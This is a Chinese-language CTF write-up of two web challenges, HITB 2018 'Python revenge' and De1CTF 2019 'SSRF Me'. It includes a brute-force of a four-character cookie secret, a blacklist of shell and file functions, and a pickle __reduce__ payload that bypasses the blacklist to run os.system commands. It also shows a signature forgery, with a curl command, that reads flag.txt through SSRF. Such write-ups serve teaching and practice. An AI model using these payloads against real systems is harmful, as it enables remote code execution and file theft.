### CTF

#### Python revenge

https://github.com/p4-team/ctf/blob/master/2018-04-11-hitb-quals/web_python/revenge.py

先查看首页，也就是根目录的路由代码

```python
def home():
    remembered_str = 'Hello, here\'s what we remember for you. And you can change, delete or extend it.'
    new_str = 'Hello fellow zombie, have you found a tasty brain and want to remember where? Go right here and enter it:'
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('index.html', txt=remembered_str, location=location)
```

先走一次`getlocation`判断，然后根据返回来判断是否跳转。查看函数。获取cookie值，不存在返回空，再回到上面的函数执行路由`clear`。存在的话，执行一次cookie的比对，比对的方式是重新计算cookie和获取到的比对。如果一致则代表通过，否则返回false。通过后调用`loads`来解析。

```python
def getlocation():
    cookie = request.cookies.get('location')
    if not cookie:
        return ''
    (digest, location) = cookie.split("!")
    if not safe_str_cmp(calc_digest(location, cookie_secret), digest):
        flash("Hey! This is not a valid cookie! Leave me alone.")
        return False
    location = loads(b64d(location))
    return location
```

`calc_digest`函数就是计算cookie的函数，获取到一个sha256的加密值，其中secret是随机生成的四位字符串

```python
def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()
```

```python
if not os.path.exists('.secret'):
    with open(".secret", "w") as f:
        secret = ''.join(random.choice(string.ascii_letters + string.digits)
                         for x in range(4))
        f.write(secret)
with open(".secret", "r") as f:
    cookie_secret = f.read().strip()
```

然后再去看一下如果不存在cookie的情况下，如何去生成cookie。`reminder()`函数，从表单接收reminder参数。参数序列化进行base64编码，生成一个名为location的Cookie值。在跳转到首页，如果只是GET请求，会先验证cookie的真实性，然后再根据返回来判断是否清除cookie。

```python
def reminder():
    if request.method == 'POST':
        location = request.form["reminder"]
        if location == '':
            flash("Message cleared, tell us when you have found more brains.")
        else:
            flash("We will remember where you find your brains.")
        location = b64e(pickle.dumps(location))
        cookie = make_cookie(location, cookie_secret)
        response = redirect(url_for('home'))
        response.set_cookie('location', cookie)
        return response
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('reminder.html')
```

所以大致流程已经清楚，根据提交的值--序列化为base64的值--验证通过后反序列化返回cookie。所以这里就是对python反序列化的构造和应用。

我们先获取一个cookie，构造一个字符串到reminder页面。可以获取如下一个cookie，要经过验证就要判断`VnNzc3MKcDAKLg==`和密钥的sha256加密等于前面的字符串。所以需要提前知道密钥是多少，但是密钥是四位的，所以我们可以采用爆破的形式来破解密钥。

```
location=95f773f3adc8968a30d4d537954e71e73e3e34e44ed603fa9a7664ed9ece08bf!VnNzc3MKcDAKLg==
```

使用如下脚本爆破出密钥为`T9di`

```
>>> while True:
...     sercet = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(4))
...     if sha256("%s%s" % ("VnNzc3MKcDAKLg==", sercet)).hexdigest() == "95f773f3adc8968a30d4d537954e71e73e3e3
4e44ed603fa9a7664ed9ece08bf":
...             print(sercet)
...             break
```

构造一个反序列化opcode的时候有一个黑名单限制使用函数

```
black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
```

禁用不够全面，可以采用其他的关键词来执行，比如使用map函数来绕过限制。

```python
class Test(object):
    def __reduce__(self):
        return map,(__import__('os').system,['whoami',])

a = Test()
payload = base64.b64encode(pickle.dumps(a))
```

然后把得到的base64值和密钥加密后发给首页根目录。

```
Cookie:location=dea18c9653ca0fb0ecd4c4d906e071270fbd168f2c64e4295a7d05b34bd080e2!Y19fYnVpbHRpbl9fCm1hcApwMAooY3Bvc2l4CnN5c3RlbQpwMQoobHAyClMnd2hvYW1pJwpwMwphdHA0ClJwNQou
```

#### SSRF ME

https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/SSRF%20Me/docker.zip

搭建环境后，访问首页可以看到给出的源码信息，有两个路由，其中De1ta是主要访问地址

```python
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
```

其中从前端获取三个参数，两个是从cookie中获取，一个是参数中获取。后面有一个waf判断，先进去查看，判断协议是否为gopher或者file开头的协议请求，防止直接读取文件。

```python
def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False
```

过waf后，进入Task类，输出Exec函数的

```python
class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False
```

获取到的参数值传到类变量内，执行Exec函数，首先判断的是`checkSign`，调用的`getSign`

```python
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
```

其中key是不知道的，先继续看下去。校验成功后查看action是否为scan，是的话写入文件，写入的是`scan`函数的值，看到`scan`函数就知道为啥过滤协议了，这个可以任意文件读取。

```python
def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"
```

如果action为read，则读取刚才写入的文件，返回到`challenge`最终显示到页面上。`geneSign`生成一个sign值，用来返回给前端。

```python
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
```

只不过这里有一个问题就是对比的问题，`geneSign`自己填充了action为scan，执行`getSign`的时候其实是

`md5(secert_key + param + 'scan')`，而上面对比的调用`getSign`的时候，传入param和action都是自己获取的。那么传入param为`flag.txtread`，action为`scan`的时候，这样跟`geneSign`调用的时候参数`param`为flag.txt，`action`为readscan时，返回的就是同一个sign。

先调用geneSign获取值为：`26fc751d30aebd74d637e9d00208a590`，再路由`De1ta`中，输入参数parma为`flag.txt`，action为`readscan`，sign就等于上面这个sign。

```
curl -i http://106.54.181.187/De1ta?param=flag.txt --header "Cookie:action=readscan;sign=26fc751d30aebd74d637e9d00208a590"
```

